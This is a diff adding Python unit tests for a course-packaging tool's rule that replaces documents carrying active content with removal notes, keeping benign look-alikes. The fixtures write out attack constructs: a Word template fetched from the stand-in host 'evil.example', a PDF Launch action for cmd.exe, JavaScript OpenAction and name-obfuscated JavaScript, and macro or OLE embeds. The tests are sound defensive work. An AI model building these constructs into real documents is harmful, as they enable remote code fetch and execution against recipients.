@@ -306,5 +306,82 @@ class DownloadJunk(unittest.TestCase):
         self.assertIn("advert", reasons["Visit Us.txt"])
 
 
+def docx(path: Path, extra: dict | None = None, rels: str = "") -> Path:
+    members = {"[Content_Types].xml": "<Types/>", "word/document.xml": "<w:document><w:t>hi</w:t></w:document>",
+               "word/_rels/document.xml.rels": f'<Relationships>{rels}</Relationships>'}
+    members.update(extra or {})
+    return make_zip(path, members)
+
+
+class ActiveContent(unittest.TestCase):
+    """Rule 5: documents that can run or fetch something are replaced by notes."""
+
+    EXTERNAL_TEMPLATE = ('<Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
+                         'Target="https://evil.example/t.dotm" TargetMode="External"/>')
+    HYPERLINK = ('<Relationship Id="r2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
+                 'Target="https://cisco.com" TargetMode="External"/>')
+
+    def setUp(self):
+        self.tmp = tempfile.TemporaryDirectory()
+        import zlib
+        c = self.course = Path(self.tmp.name, "Docs")
+        touch(c / "1 - a.mp4")
+        docx(c / "2 - macro.docx", {"word/vbaProject.bin": b"\x00"})
+        docx(c / "3 - template.docx", rels=self.EXTERNAL_TEMPLATE)
+        docx(c / "4 - links only.docx", rels=self.HYPERLINK)                              # benign
+        docx(c / "5 - chart.docx", {"word/embeddings/Microsoft_Excel_Worksheet.xlsx": b"PK"})  # benign
+        docx(c / "6 - ole.docx", {"word/embeddings/oleObject1.bin": b"\xd0\xcf"})
+        touch(c / "7 - js.pdf", b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >> endobj")
+        touch(c / "8 - hidden.pdf", b"%PDF-1.7\n2 0 obj << /Length 9 /Filter /FlateDecode >> stream\n"
+              + zlib.compress(b"<< /S /Launch /F (cmd.exe) >>") + b"\nendstream endobj")
+        touch(c / "9 - obfuscated.pdf", b"%PDF-1.7\n3 0 obj << /S /J#61vaScript /JS (x) >> endobj")
+        touch(c / "10 - plain.pdf", b"%PDF-1.7\n4 0 obj << /Type /Page >> endobj")              # benign
+        # benign: "/JS" by chance inside compressed image bytes (seen in real course PDFs)
+        touch(c / "15 - image.pdf", b"%PDF-1.7\n5 0 obj << /Type /XObject /Subtype /Image /Filter /FlateDecode >> stream\n"
+              + zlib.compress(b"\x83/JS\x18!\xcd\x00\xff" * 50) + b"\nendstream endobj")
+        touch(c / "11 - object.rtf", b"{\\rtf1 {\\object\\objemb {\\*\\objdata 0105}}}")
+        touch(c / "12 - macros.xlsm", b"PK")
+        make_zip(c / "13 - lab pack.zip", {"notes.txt": b"n"})
+        with zipfile.ZipFile(c / "13 - lab pack.zip", "a") as z:
+            buf = io.BytesIO()
+            with zipfile.ZipFile(buf, "w") as inner:
+                inner.writestr("[Content_Types].xml", "<Types/>"); inner.writestr("word/vbaProject.bin", "x")
+            z.writestr("bad.docx", buf.getvalue())
+        touch(c / "14 - legacy.doc", b"\xd0\xcf\x11\xe0" + b"\x00" * 60 + "_VBA_PROJECT".encode("utf-16-le"))
+
+    def tearDown(self):
+        self.tmp.cleanup()
+
+    def all_entries(self):
+        return {n for z in self.course.rglob("*.zip") if ".material" in z.name or z.name == "additional-material.zip" for n in names(z)}
+
+    def test_blocked_and_allowed(self):
+        code, out, _ = run(str(self.course), "--apply", "--levels", "course")
+        self.assertEqual(code, 0, out)
+        got = names(self.course / "additional-material.zip")
+        for blocked in ("2 - macro.docx", "3 - template.docx", "6 - ole.docx", "7 - js.pdf", "8 - hidden.pdf",
+                        "9 - obfuscated.pdf", "11 - object.rtf", "12 - macros.xlsm", "13 - lab pack.zip", "14 - legacy.doc"):
+            self.assertIn(blocked + ".REMOVED.txt", got, blocked)
+            self.assertNotIn(blocked, got)
+        for kept in ("4 - links only.docx", "5 - chart.docx", "10 - plain.pdf", "15 - image.pdf"):
+            self.assertIn(kept, got, kept)
+        with zipfile.ZipFile(self.course / "additional-material.zip") as z:
+            self.assertIn("external attachedTemplate (https://evil.example/t.dotm)", z.read("3 - template.docx.REMOVED.txt").decode())
+            self.assertIn("a Launch action", z.read("8 - hidden.pdf.REMOVED.txt").decode())
+            self.assertIn("JavaScript", z.read("9 - obfuscated.pdf.REMOVED.txt").decode())
+            self.assertIn("bad.docx: macros", z.read("13 - lab pack.zip.REMOVED.txt").decode())
+
+    def test_allow_active_documents(self):
+        run(str(self.course), "--apply", "--levels", "course", "--allow-active-documents")
+        got = names(self.course / "additional-material.zip")
+        self.assertIn("2 - macro.docx", got)
+        self.assertIn("7 - js.pdf", got)
+        self.assertIn("12 - macros.xlsm.REMOVED.txt", got)     # macro-enabled types are executables
+        run(str(self.course), "--apply", "--force", "--levels", "course", "--allow-executables")
+        got = names(self.course / "additional-material.zip")
+        self.assertIn("12 - macros.xlsm", got)
+        self.assertIn("2 - macro.docx.REMOVED.txt", got)      # documents still need their own flag
+
+
 if __name__ == "__main__":
     unittest.main()
